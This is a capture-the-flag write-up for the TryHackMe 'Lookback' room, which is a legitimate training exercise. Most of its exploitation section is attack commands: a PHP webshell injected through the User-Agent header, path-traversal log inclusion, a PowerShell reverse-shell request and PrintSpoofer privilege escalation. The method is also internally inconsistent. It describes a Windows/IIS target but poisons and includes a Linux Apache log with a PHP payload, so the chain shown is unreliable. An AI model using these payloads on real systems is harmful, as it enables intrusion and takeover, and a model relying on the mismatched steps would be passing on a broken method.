# 📋 Lookback

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Lookback](https://tryhackme.com/room/lookback) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web, Windows |
| **OS** | Windows |
| **Tools** | nmap, Burp Suite, curl |

---

## 🎯 Objective

Exploit a log viewing application via log poisoning to achieve RCE and escalate privileges on a Windows machine.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
```

**Open ports:**
```
80/tcp   open  http    Microsoft IIS
443/tcp  open  https   Microsoft IIS
3389/tcp open  rdp
```

Web app allows viewing system logs through a parameter:
```
http://TARGET_IP/test/log?file=access_log
```

---

## 💥 Exploitation — Log Poisoning

The application displays log file contents. If we can write to the log and then include it — we achieve RCE.

**Inject PHP/command in User-Agent:**
```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET_IP/
```

**Include the poisoned log:**
```
http://TARGET_IP/test/log?file=../../../../../var/log/apache2/access_log&cmd=id
```

For Windows/IIS:
```bash
# Inject into IIS logs via User-Agent
curl -H "User-Agent: test" http://TARGET_IP/

# Read log through LFI
http://TARGET_IP/test/log?file=C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
```

Getting reverse shell:
```bash
# PowerShell reverse shell via cmd parameter
http://TARGET_IP/?cmd=powershell+-e+BASE64_ENCODED_REVERSESHELL
```

---

## 🔐 Privilege Escalation

```bash
# Check privileges
whoami /priv

# SeImpersonatePrivilege — use PrintSpoofer or GodPotato
.\PrintSpoofer.exe -i -c cmd
# SYSTEM shell obtained
```

---

## 📚 Lessons Learned

- Log poisoning turns LFI into RCE — if you can write to a log and include it, you have code execution
- Never expose log file paths via user-controlled parameters
- SeImpersonatePrivilege on Windows service accounts is almost always exploitable for SYSTEM
- Input sanitisation in the `User-Agent` header is frequently overlooked

---
*by OwlRC 🦉 | github.com/OwlRC*
